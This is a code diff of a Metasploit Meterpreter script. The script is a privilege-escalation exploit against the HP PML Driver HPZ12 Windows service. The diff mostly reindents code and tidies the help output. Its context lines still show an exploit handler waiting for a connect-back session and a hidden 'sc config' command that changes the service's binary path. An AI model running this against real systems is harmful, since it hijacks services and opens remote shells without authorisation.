@@ -23,9 +23,9 @@
 # Options
 #
 opts = Rex::Parser::Arguments.new(
-        "-h"  => [ false,  "This help menu"],
-        "-r"  => [ true,   "The IP of the system running Metasploit listening for the connect back"],
-        "-p"  => [ true,   "The port on the remote host where Metasploit is listening"]
+	"-h"  => [ false,  "This help menu"],
+	"-r"  => [ true,   "The IP of the system running Metasploit listening for the connect back"],
+	"-p"  => [ true,   "The port on the remote host where Metasploit is listening"]
 )
 
 #
@@ -39,15 +39,16 @@ rport = 4444
 # Option parsing
 #
 opts.parse(args) do |opt, idx, val|
-        case opt
-        when "-h"
-                print_status("HP PML Driver HPZ12 SERVICE_CHANGE_CONFIG privilege escalation." + opts.usage)
+	case opt
+	when "-h"
+		print_status("HP PML Driver HPZ12 SERVICE_CHANGE_CONFIG privilege escalation.")
+		print_line(opts.usage)
 		raise Rex::Script::Completed
-        when "-r"
-                rhost = val
-        when "-p"
-                rport = val.to_i
-        end
+	when "-r"
+		rhost = val
+	when "-p"
+		rport = val.to_i
+	end
 end
 
 client.sys.process.get_processes().each do |m|
@@ -88,12 +89,11 @@ client.sys.process.get_processes().each do |m|
 		handler.datastore['ExitOnSession'] = false
 
 		handler.exploit_simple(
-			'Payload'        => handler.datastore['PAYLOAD'],
+			'Payload'	=> handler.datastore['PAYLOAD'],
 			'RunAsJob'       => true
 		)
 
 		client.sys.process.execute("cmd.exe /c sc config \"Pml Driver HPZ12\" binpath= %SystemRoot%\\system32\\HPZipm12.exe", nil, {'Hidden' => 'true'})
 			
-	else
 	end
 end
